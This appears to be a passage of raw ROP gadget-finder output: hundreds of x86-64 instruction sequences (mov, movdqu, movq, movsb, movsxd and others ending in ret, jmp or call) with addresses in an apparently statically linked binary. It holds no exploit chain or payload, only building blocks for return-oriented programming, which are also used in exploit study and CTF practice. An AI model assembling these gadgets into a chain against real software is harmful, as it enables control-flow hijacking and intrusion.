0x0000000000494cd1 : mov rax, qword ptr [rsi + 0x10] ; ret
0x0000000000491b60 : mov rax, qword ptr [rsi + 0xa8] ; ret
0x0000000000491b33 : mov rax, qword ptr [rsi + 0xb0] ; ret
0x0000000000491b50 : mov rax, qword ptr [rsi + 0xb8] ; ret
0x0000000000494cf0 : mov rax, qword ptr [rsi + 8] ; ret
0x00000000004728fb : mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x0000000000467ac0 : mov rax, qword ptr [rsi + rax*8] ; mov esi, 1 ; jmp rax
0x0000000000468118 : mov rax, qword ptr [rsi + rax*8] ; xor esi, esi ; jmp rax
0x0000000000493e55 : mov rax, qword ptr [rsp + 0x10] ; add rsp, 0x28 ; ret
0x00000000004512c5 : mov rax, qword ptr [rsp + 0x10] ; call rax
0x0000000000407ab2 : mov rax, qword ptr [rsp + 0x18] ; call rax
0x0000000000459d3b : mov rax, qword ptr [rsp + 0x20] ; call rax
0x000000000041488c : mov rax, qword ptr [rsp + 8] ; call rax
0x00000000004019dd : mov rax, qword ptr [rsp + 8] ; sub rax, rcx ; ret
0x00000000004915c9 : mov rax, qword ptr [rsp] ; add rsp, 0x38 ; ret
0x000000000040196f : mov rax, r11 ; ret
0x00000000004758f7 : mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000045168d : mov rax, r13 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000042139f : mov rax, r8 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000042917e : mov rax, r8 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000047a6d0 : mov rax, r8 ; vzeroupper ; ret
0x0000000000451ca3 : mov rax, rbp ; pop rbx ; pop rbp ; jmp rax
0x0000000000416c22 : mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000041a806 : mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000493f8a : mov rax, rbp ; pop rbx ; pop rbp ; ret
0x000000000040153c : mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000041b184 : mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000450edf : mov rax, rbx ; pop rbx ; pop rbp ; ret
0x00000000004194fa : mov rax, rbx ; pop rbx ; ret
0x000000000048533b : mov rax, rcx ; ret
0x00000000004193f2 : mov rax, rdi ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000421634 : mov rax, rdi ; pop rbp ; pop r12 ; ret
0x0000000000419423 : mov rax, rdi ; ret
0x0000000000421234 : mov rax, rdx ; add rsp, 8 ; ret
0x000000000047bf5a : mov rax, rdx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000420bec : mov rax, rdx ; pop rbx ; pop rbp ; ret
0x000000000044ecc5 : mov rax, rdx ; pop rbx ; ret
0x0000000000421240 : mov rax, rdx ; ret
0x00000000004246fc : mov rax, rsi ; pop rbx ; ret
0x0000000000424730 : mov rax, rsi ; ret
0x00000000004942b2 : mov rbp, qword ptr [rbp] ; mov rsp, rcx ; ret
0x00000000004954f9 : mov rbp, qword ptr [rsp + 8] ; jmp 0x495519
0x00000000004892dc : mov rbp, r9 ; nop ; jmp rdx
0x0000000000476a58 : mov rbp, rax ; jmp 0x476a23
0x0000000000403453 : mov rbx, qword ptr [rsi - 8] ; lea rsp, qword ptr [rsi] ; ret
0x00000000004017ff : mov rbx, r8 ; or rax, r9 ; ret
0x00000000004611c5 : mov rbx, rdi ; test rax, rax ; je 0x4611d7 ; call rax
0x000000000044aca0 : mov rcx, qword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x0000000000488786 : mov rcx, qword ptr [rsp + 0x40] ; add rsp, 0x48 ; jmp qword ptr [rax]
0x0000000000488714 : mov rcx, qword ptr [rsp + 0x40] ; add rsp, 0x58 ; jmp qword ptr [rax]
0x0000000000479110 : mov rcx, rax ; jmp 0x4790dc
0x000000000044da21 : mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000400dc2 : mov rcx, rdx ; rep movsq qword ptr [rdi], qword ptr [rsi] ; nop ; leave ; ret
0x0000000000451dbb : mov rdi, qword ptr [r13] ; call r12
0x0000000000414888 : mov rdi, qword ptr [r13] ; mov rax, qword ptr [rsp + 8] ; call rax
0x0000000000415323 : mov rdi, qword ptr [rax + 0x20] ; call rdx
0x00000000004516fb : mov rdi, qword ptr [rbp - 0x58] ; mov r12d, r14d ; call r15
0x00000000004648da : mov rdi, qword ptr [rbp - 0x8a8] ; call rax
0x000000000046fdec : mov rdi, qword ptr [rbp - 0x8d0] ; call rax
0x000000000046bcc3 : mov rdi, qword ptr [rbp - 0xc0] ; call rax
0x00000000004511e3 : mov rdi, qword ptr [rbp] ; call r12
0x00000000004511bd : mov rdi, qword ptr [rbx] ; call r12
0x0000000000495a0d : mov rdi, qword ptr [rsp + 0x10] ; call r14
0x0000000000457b04 : mov rdi, qword ptr [rsp + 0x20] ; call r15
0x00000000004583e0 : mov rdi, qword ptr [rsp + 0x30] ; call r14
0x00000000004585b8 : mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x00000000004588a2 : mov rdi, qword ptr [rsp + 0x38] ; call r12
0x0000000000458eda : mov rdi, qword ptr [rsp + 0x38] ; call r14
0x000000000045be9e : mov rdi, qword ptr [rsp + 0x38] ; call r15
0x00000000004580e8 : mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x000000000045a319 : mov rdi, qword ptr [rsp + 0x40] ; call r15
0x000000000045cac5 : mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x000000000041d0f5 : mov rdi, qword ptr [rsp] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x00000000004948fb : mov rdi, qword ptr [rsp] ; mov rdx, qword ptr [rbp] ; call r12
0x000000000040a937 : mov rdi, r12 ; call 0x426b85
0x0000000000494803 : mov rdi, r12 ; call r15
0x0000000000478b8f : mov rdi, r12 ; call rbx
0x0000000000428502 : mov rdi, r13 ; call 0x424745
0x000000000045edfb : mov rdi, r13 ; call r12
0x00000000004957eb : mov rdi, r13 ; call r14
0x0000000000498c60 : mov rdi, r13 ; call rax
0x0000000000414918 : mov rdi, r13 ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000045ef52 : mov rdi, r14 ; call rbx
0x000000000045f230 : mov rdi, r14 ; call rdx
0x0000000000478e67 : mov rdi, r15 ; call r12
0x0000000000417d02 : mov rdi, r15 ; call rax
0x0000000000455caa : mov rdi, r15 ; mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x0000000000429fe3 : mov rdi, rax ; call rcx
0x0000000000429365 : mov rdi, rbp ; call rax
0x000000000047ad40 : mov rdi, rbp ; call rbx
0x000000000047ae91 : mov rdi, rbp ; mov r9, r14 ; call rbx
0x0000000000464171 : mov rdi, rbx ; call 0x400445
0x00000000004556bd : mov rdi, rbx ; call r14
0x0000000000419dd5 : mov rdi, rbx ; call rax
0x000000000041d18c : mov rdi, rbx ; pop rbx ; pop rbp ; jmp rax
0x00000000004779ee : mov rdi, rbx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x0000000000493a38 : mov rdx, qword ptr [r12] ; mov edi, 1 ; call rax
0x00000000004957e8 : mov rdx, qword ptr [r15] ; mov rdi, r13 ; call r14
0x00000000004948ff : mov rdx, qword ptr [rbp] ; call r12
0x000000000048ba28 : mov rdx, qword ptr [rbx + 0x18] ; mov qword ptr [rdx], rax ; pop rbx ; ret
0x000000000048ba3c : mov rdx, qword ptr [rdi + 0x30] ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x0000000000435dd0 : mov rdx, qword ptr [rsi - 8] ; mov qword ptr [rdi - 8], rdx ; ret
0x000000000043c060 : mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x00000000004891b8 : mov rdx, qword ptr [rsp + 0x10] ; call rdx
0x0000000000490668 : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [r14]
0x000000000049073c : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000490818 : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rcx]
0x0000000000490622 : mov rdx, r13 ; mov rsi, r12 ; mov edi, ebp ; call rax
0x0000000000475ff1 : mov rdx, r8 ; jmp 0x475fc1
0x0000000000429fe8 : mov rdx, rax ; jmp 0x429f9d
0x000000000045d019 : mov rdx, rax ; jmp 0x45cfd2
0x000000000045d150 : mov rdx, rax ; jmp 0x45d111
0x000000000045d41e : mov rdx, rax ; jmp 0x45d3d7
0x000000000045d495 : mov rdx, rax ; jmp 0x45d44e
0x000000000047ca7d : mov rdx, rax ; jmp 0x47ca73
0x000000000044e6e7 : mov rdx, rdi ; rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x00000000004948b4 : mov rsi, qword ptr [r14] ; call r12
0x0000000000495a0a : mov rsi, qword ptr [r15] ; mov rdi, qword ptr [rsp + 0x10] ; call r14
0x000000000045fcc3 : mov rsi, qword ptr [rax + r14*8] ; test rsi, rsi ; je 0x45fcd7 ; call rsi
0x0000000000455cad : mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x00000000004553b5 : mov rsi, qword ptr [rsp + 0x18] ; mov r9, r13 ; call rbx
0x0000000000429360 : mov rsi, qword ptr [rsp + 0x28] ; mov rdi, rbp ; call rax
0x0000000000426d78 : mov rsi, qword ptr [rsp + 0x68] ; call rax
0x000000000049066b : mov rsi, r12 ; mov edi, ebp ; call qword ptr [r14]
0x000000000049073f : mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x000000000049081b : mov rsi, r12 ; mov edi, ebp ; call qword ptr [rcx]
0x0000000000490625 : mov rsi, r12 ; mov edi, ebp ; call rax
0x0000000000494800 : mov rsi, r14 ; mov rdi, r12 ; call r15
0x0000000000429fe0 : mov rsi, rbp ; mov rdi, rax ; call rcx
0x00000000004284ff : mov rsi, rbx ; mov rdi, r13 ; call 0x424748
0x00000000004947a9 : mov rsi, rdi ; mov edi, 1 ; jmp rax
0x00000000004852d2 : mov rsi, rdx ; cmp rcx, rsi ; jne 0x4852b9 ; ret
0x00000000004892d9 : mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
0x00000000004942b6 : mov rsp, rcx ; ret
0x0000000000473426 : mov ss, word ptr [rax + rax + 0x63490000] ; ret 0x8948
0x00000000004201ce : mov ss, word ptr [rsi] ; sub al, byte ptr [rax] ; ret
0x000000000043f035 : mov word ptr [r9 - 2], cx ; ret
0x00000000004bc788 : mov word ptr [rbp + 0x2a640000], ds ; std ; jmp rsp
0x0000000000406f7b : mov word ptr [rcx], ss ; and esi, 0x2141d8a1 ; ret
0x0000000000407013 : mov word ptr [rcx], ss ; xchg dword ptr [rip + 0x2141f4d5], ecx ; ret
0x000000000044b3cc : mov word ptr [rdi + 0x10], cx ; lea rax, qword ptr [rdi + 0x11] ; ret
0x000000000044ad3c : mov word ptr [rdi + 0x10], cx ; ret
0x000000000044b4d4 : mov word ptr [rdi + 0x18], cx ; lea rax, qword ptr [rdi + 0x19] ; ret
0x000000000044ae24 : mov word ptr [rdi + 0x18], cx ; ret
0x000000000043c297 : mov word ptr [rdi + 1], dx ; mov word ptr [rdi], cx ; ret
0x000000000044b298 : mov word ptr [rdi + 4], dx ; lea rax, qword ptr [rdi + 5] ; ret
0x000000000044ac78 : mov word ptr [rdi + 4], dx ; ret
0x000000000044b2ea : mov word ptr [rdi + 8], dx ; lea rax, qword ptr [rdi + 9] ; ret
0x000000000044acba : mov word ptr [rdi + 8], dx ; ret
0x000000000044e7ca : mov word ptr [rdi + rdx - 2], cx ; mov word ptr [rdi], cx ; ret
0x000000000044da64 : mov word ptr [rdi + rdx - 2], cx ; mov word ptr [rdi], si ; ret
0x000000000043636c : mov word ptr [rdi - 2], cx ; ret
0x0000000000436184 : mov word ptr [rdi - 2], dx ; ret
0x0000000000436368 : mov word ptr [rdi - 3], dx ; mov word ptr [rdi - 2], cx ; ret
0x000000000044ac43 : mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x000000000044d7a2 : mov word ptr [rdi], cx ; mov word ptr [rsi - 2], cx ; ret
0x000000000043c29b : mov word ptr [rdi], cx ; ret
0x000000000044e954 : mov word ptr [rdi], cx ; vzeroupper ; ret
0x000000000044b253 : mov word ptr [rdi], dx ; lea rax, qword ptr [rdi + 1] ; ret
0x000000000043c303 : mov word ptr [rdi], dx ; ret
0x000000000043f032 : mov word ptr [rdi], si ; mov word ptr [r9 - 2], cx ; ret
0x000000000044da69 : mov word ptr [rdi], si ; ret
0x000000000044a7b8 : mov word ptr [rdx + 4], ax ; lea rax, qword ptr [rdx + 5] ; ret
0x0000000000448ff8 : mov word ptr [rdx + 4], ax ; mov rax, rdi ; ret
0x000000000048bf10 : mov word ptr [rdx - 0x76b7ffdd], es ; ret 0xc148
0x000000000044a763 : mov word ptr [rdx], ax ; lea rax, qword ptr [rdx + 1] ; ret
0x0000000000448fb3 : mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x000000000044d7a5 : mov word ptr [rsi - 2], cx ; ret
0x000000000040b15b : mov word ptr [rsp + rcx*4], fs ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x149
0x000000000044da63 : mov word ptr ss:[rdi + rdx - 2], cx ; mov word ptr [rdi], si ; ret
0x000000000044df37 : movabs al, byte ptr [0x77f8c5237f7ec1c4] ; ret
0x0000000000473eca : movabs al, byte ptr [0x840fc08548000000] ; ret
0x00000000004296f1 : movabs dword ptr [0xe820c48348002980], eax ; ret 0xfed1
0x00000000004348f2 : movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00000000004348ee : movaps xmmword ptr [rdi - 0x20], xmm4 ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x000000000043499c : movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x000000000044ad10 : movdqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x000000000044b58d : movdqu xmmword ptr [rdi + 0x10], xmm2 ; lea rax, qword ptr [rdi + 0x1f] ; ret
0x0000000000403a77 : movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x000000000043bf6f : movdqu xmmword ptr [rdi + 0xa], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043beff : movdqu xmmword ptr [rdi + 0xb], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043be8f : movdqu xmmword ptr [rdi + 0xc], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043be1f : movdqu xmmword ptr [rdi + 0xd], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044b52d : movdqu xmmword ptr [rdi + 0xd], xmm2 ; lea rax, qword ptr [rdi + 0x1c] ; ret
0x000000000044ae7d : movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x000000000043bdaf : movdqu xmmword ptr [rdi + 0xe], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044b54d : movdqu xmmword ptr [rdi + 0xe], xmm2 ; lea rax, qword ptr [rdi + 0x1d] ; ret
0x000000000044ae9d : movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x000000000043bd3f : movdqu xmmword ptr [rdi + 0xf], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044b56d : movdqu xmmword ptr [rdi + 0xf], xmm2 ; lea rax, qword ptr [rdi + 0x1e] ; ret
0x000000000044aebd : movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x000000000043c35f : movdqu xmmword ptr [rdi + 1], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c2ef : movdqu xmmword ptr [rdi + 2], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c27f : movdqu xmmword ptr [rdi + 3], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c20f : movdqu xmmword ptr [rdi + 4], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c19f : movdqu xmmword ptr [rdi + 5], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c12f : movdqu xmmword ptr [rdi + 6], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c0bf : movdqu xmmword ptr [rdi + 7], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c04f : movdqu xmmword ptr [rdi + 8], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043bfdf : movdqu xmmword ptr [rdi + 9], xmm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044e73d : movdqu xmmword ptr [rdi + rdx - 0x20], xmm0 ; ret
0x000000000043b4cb : movdqu xmmword ptr [rdi - 0x10], xmm0 ; ret
0x000000000043b53b : movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000044b3a4 : movdqu xmmword ptr [rdi], xmm0 ; lea rax, qword ptr [rdi + 0xf] ; ret
0x000000000044ad24 : movdqu xmmword ptr [rdi], xmm0 ; mov byte ptr [rdi + 0x10], dh ; ret
0x000000000044ad67 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x000000000044ad57 : movdqu xmmword ptr [rdi], xmm0 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x000000000044add8 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x000000000044ad98 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x000000000044adb8 : movdqu xmmword ptr [rdi], xmm0 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x000000000044ad38 : movdqu xmmword ptr [rdi], xmm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x000000000044aed9 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x000000000044ae79 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x000000000044ae99 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x000000000044aeb9 : movdqu xmmword ptr [rdi], xmm0 ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x000000000043bcea : movdqu xmmword ptr [rdi], xmm0 ; ret
0x000000000043bd44 : movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044ad11 : movq mm0, qword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x000000000044b58e : movq qword ptr [rdi + 0x10], mm2 ; lea rax, qword ptr [rdi + 0x1f] ; ret
0x0000000000403a78 : movq qword ptr [rdi + 0x10], mm2 ; ret
0x000000000043bf70 : movq qword ptr [rdi + 0xa], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043bf00 : movq qword ptr [rdi + 0xb], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043be90 : movq qword ptr [rdi + 0xc], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043be20 : movq qword ptr [rdi + 0xd], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044b52e : movq qword ptr [rdi + 0xd], mm2 ; lea rax, qword ptr [rdi + 0x1c] ; ret
0x000000000044ae7e : movq qword ptr [rdi + 0xd], mm2 ; ret
0x000000000043bdb0 : movq qword ptr [rdi + 0xe], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044b54e : movq qword ptr [rdi + 0xe], mm2 ; lea rax, qword ptr [rdi + 0x1d] ; ret
0x000000000044ae9e : movq qword ptr [rdi + 0xe], mm2 ; ret
0x000000000043bd40 : movq qword ptr [rdi + 0xf], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044b56e : movq qword ptr [rdi + 0xf], mm2 ; lea rax, qword ptr [rdi + 0x1e] ; ret
0x000000000044aebe : movq qword ptr [rdi + 0xf], mm2 ; ret
0x000000000043c360 : movq qword ptr [rdi + 1], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c2f0 : movq qword ptr [rdi + 2], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c280 : movq qword ptr [rdi + 3], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c210 : movq qword ptr [rdi + 4], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c1a0 : movq qword ptr [rdi + 5], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c130 : movq qword ptr [rdi + 6], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c0c0 : movq qword ptr [rdi + 7], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043c050 : movq qword ptr [rdi + 8], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000043bfe0 : movq qword ptr [rdi + 9], mm0 ; movdqu xmmword ptr [rdi], xmm1 ; ret
0x000000000044e6c5 : movq qword ptr [rdi + rdx - 0x10], mm0 ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x000000000044e73e : movq qword ptr [rdi + rdx - 0x20], mm0 ; ret
0x000000000043b4cc : movq qword ptr [rdi - 0x10], mm0 ; ret
0x000000000043b53c : movq qword ptr [rdi - 0x10], mm1 ; ret
0x000000000043bc77 : movq qword ptr [rdi - 0x11], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043bbf7 : movq qword ptr [rdi - 0x12], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043bb67 : movq qword ptr [rdi - 0x13], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043bae7 : movq qword ptr [rdi - 0x14], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043ba67 : movq qword ptr [rdi - 0x15], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043b9e7 : movq qword ptr [rdi - 0x16], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043b967 : movq qword ptr [rdi - 0x17], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043b8e7 : movq qword ptr [rdi - 0x18], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043b867 : movq qword ptr [rdi - 0x19], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043b7e7 : movq qword ptr [rdi - 0x1a], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043b767 : movq qword ptr [rdi - 0x1b], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043b6e7 : movq qword ptr [rdi - 0x1c], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043b657 : movq qword ptr [rdi - 0x1d], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043b5c7 : movq qword ptr [rdi - 0x1e], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000043b537 : movq qword ptr [rdi - 0x1f], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x000000000044b3a5 : movq qword ptr [rdi], mm0 ; lea rax, qword ptr [rdi + 0xf] ; ret
0x000000000044ad25 : movq qword ptr [rdi], mm0 ; mov byte ptr [rdi + 0x10], dh ; ret
0x000000000044ad78 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x000000000044ad68 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x000000000044ad58 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x000000000044add9 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x000000000044ad99 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x000000000044adb9 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x000000000044ad39 : movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x000000000044aeda : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x000000000044ae7a : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x000000000044ae9a : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x000000000044aeba : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x000000000043bceb : movq qword ptr [rdi], mm0 ; ret
0x0000000000403a74 : movq qword ptr [rdi], mm1 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x000000000043bd45 : movq qword ptr [rdi], mm1 ; ret
0x0000000000453ff8 : movsb byte ptr [rdi], byte ptr [rsi] ; add dword ptr [rdx], 0x39d23100 ; ret
0x000000000045e47c : movsb byte ptr [rdi], byte ptr [rsi] ; and al, 0x88 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x000000000044d9c5 : movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x00000000004b9229 : movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call qword ptr [rax]
0x00000000004b9211 : movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call qword ptr [rbx]
0x00000000004b923d : movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call qword ptr [rdx]
0x00000000004aed02 : movsb byte ptr [rdi], byte ptr [rsi] ; in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x00000000004aff5d : movsb byte ptr [rdi], byte ptr [rsi] ; jns 0x4affb6 ; jmp 0x4afef7
0x00000000004b7ea0 : movsb byte ptr [rdi], byte ptr [rsi] ; push rsp ; add byte ptr [rax], al ; jl 0x4b7e6e ; stc ; jmp qword ptr [rdx]
0x000000000044d9b7 : movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000049b509 : movsb byte ptr [rdi], byte ptr [rsi] ; stc ; call qword ptr [rax]
0x000000000049c968 : movsb byte ptr [rdi], byte ptr [rsi] ; xor eax, 0x35a4fffb ; sti ; jmp rdx
0x000000000049c96c : movsb byte ptr [rdi], byte ptr [rsi] ; xor eax, 0x35e2fffb ; sti ; jmp rdx
0x000000000048655c : movsb byte ptr [rdi], byte ptr [rsi] ; xor eax, eax ; ret
0x00000000004bcf7d : movsd dword ptr [rdi], dword ptr [rsi] ; add byte ptr [rax], al ; sar byte ptr [rax - 3], 1 ; call qword ptr [rbx]
0x00000000004b0595 : movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00000000004afe51 : movsd dword ptr [rdi], dword ptr [rsi] ; mov cl, byte ptr [rip - 0x114f09b0] ; fcmovb st(0), st(3) ; ret
0x0000000000400dc7 : movsd dword ptr [rdi], dword ptr [rsi] ; nop ; leave ; ret
0x0000000000467c77 : movsd dword ptr [rdi], dword ptr [rsi] ; outsb dx, byte ptr [rsi] ; and eax, 0x48b4800 ; clc ; jmp rax
0x00000000004899a2 : movsd dword ptr [rdi], dword ptr [rsi] ; ret
0x0000000000400dc6 : movsq qword ptr [rdi], qword ptr [rsi] ; nop ; leave ; ret
0x00000000004919c4 : movss dword ptr [rsp - 0x28], xmm0 ; ret
0x0000000000487a8b : movsx eax, cl ; neg eax ; ret
0x0000000000487b30 : movsx eax, dl ; sub eax, ecx ; ret
0x000000000042b361 : movsxd r9, dword ptr [r10 + r9*4] ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x000000000043994b : movsxd r9, dword ptr [r11 + r9*4] ; add r9, r11 ; jmp r9
0x00000000004343cb : movsxd r9, dword ptr [r11 + r9*4] ; lea r9, qword ptr [r11 + r9] ; jmp r9
0x0000000000492c68 : movsxd rax, dword ptr [r12 + rax*4] ; add rax, r12 ; jmp rax
0x0000000000408b1e : movsxd rax, dword ptr [r13 + rax*4] ; add rax, r13 ; jmp rax
0x0000000000493569 : movsxd rax, dword ptr [r14 + rax*4] ; add rax, r14 ; jmp rax
0x0000000000491c17 : movsxd rax, dword ptr [r15 + rax*4] ; add rax, r15 ; jmp rax
0x00000000004919f1 : movsxd rax, dword ptr [r8 + rcx*4] ; add rax, r8 ; jmp rax
0x00000000004931a1 : movsxd rax, dword ptr [r9 + r11*4] ; add rax, r9 ; jmp rax
0x000000000045412e : movsxd rax, dword ptr [rbp + rax*4] ; add rax, rbp ; jmp rax
0x00000000004540b7 : movsxd rax, dword ptr [rbx + rax*4] ; add rax, rbx ; jmp rax
0x0000000000482cfd : movsxd rax, dword ptr [rcx + r12*4] ; add rax, rcx ; jmp rax
0x00000000004756e6 : movsxd rax, dword ptr [rcx + rax*4] ; add rax, rcx ; jmp rax
0x0000000000483625 : movsxd rax, dword ptr [rdi + r12*4] ; add rax, rdi ; jmp rax
0x0000000000475d16 : movsxd rax, dword ptr [rdi + rax*4] ; add rax, rdi ; jmp rax
0x00000000004088b5 : movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
